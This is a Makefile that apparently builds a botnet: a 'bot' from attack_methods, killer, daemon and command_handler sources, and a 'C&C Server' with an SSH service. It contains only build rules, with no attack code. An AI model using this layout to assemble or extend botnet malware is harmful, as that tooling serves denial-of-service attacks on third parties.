CC = gcc
CFLAGS = -Wall -Wextra -pedantic -D_GNU_SOURCE -D_POSIX_C_SOURCE=200112L

# Bot configuration
BOT_SOURCES = bot.c attack_methods.c ascii_art.c daemon.c killer.c command_handler.c
BOT_OBJECTS = $(BOT_SOURCES:.c=.o)
BOT_TARGET = bot
BOT_LDFLAGS = -lpthread -lcurl

# C&C Server configuration
CNC_SOURCES = cnc_server.c ascii_art.c network_utils.c ssh_service.c
CNC_OBJECTS = $(CNC_SOURCES:.c=.o)
CNC_TARGET = cnc_server
CNC_LDFLAGS = -lpthread

# Debug build
DEBUG_CFLAGS = -g -DDEBUG

.PHONY: all bot cnc debug clean install

all: $(BOT_TARGET) $(CNC_TARGET)

# Bot build rules
$(BOT_TARGET): $(BOT_OBJECTS)
	$(CC) $(CFLAGS) -o $(BOT_TARGET) $(BOT_OBJECTS) $(BOT_LDFLAGS)
	@echo "Bot built successfully"

# C&C Server build rules
$(CNC_TARGET): $(CNC_OBJECTS)
	$(CC) $(CFLAGS) -o $(CNC_TARGET) $(CNC_OBJECTS) $(CNC_LDFLAGS)
	@echo "C&C Server built successfully"

# Common compilation rule
%.o: %.c
	$(CC) $(CFLAGS) -c $< -o $@

# Debug builds
debug: CFLAGS += $(DEBUG_CFLAGS)
debug: $(BOT_TARGET) $(CNC_TARGET)

# Clean both
clean:
	rm -f $(BOT_TARGET) $(CNC_TARGET) $(BOT_OBJECTS) $(CNC_OBJECTS) \
	      users_logins.txt attack_log.txt
	@echo "Clean complete"

# Install both
install: $(BOT_TARGET) $(CNC_TARGET)
	chmod +x $(BOT_TARGET) $(CNC_TARGET)
	@echo "Installation complete"

# Dependencies for bot
bot.o: bot.c bot.h attack_methods.h ascii_art.h daemon.h killer.h config.h command_handler.h
attack_methods.o: attack_methods.c attack_methods.h ascii_art.h
daemon.o: daemon.c daemon.h config.h
killer.o: killer.c killer.h config.h
command_handler.o: command_handler.c command_handler.h attack_methods.h

# Dependencies for cnc_server
cnc_server.o: cnc_server.c cnc_common.h ssh_service.h
ssh_service.o: ssh_service.c ssh_service.h cnc_common.h
network_utils.o: network_utils.c network_utils.h
ascii_art.o: ascii_art.c ascii_art.h
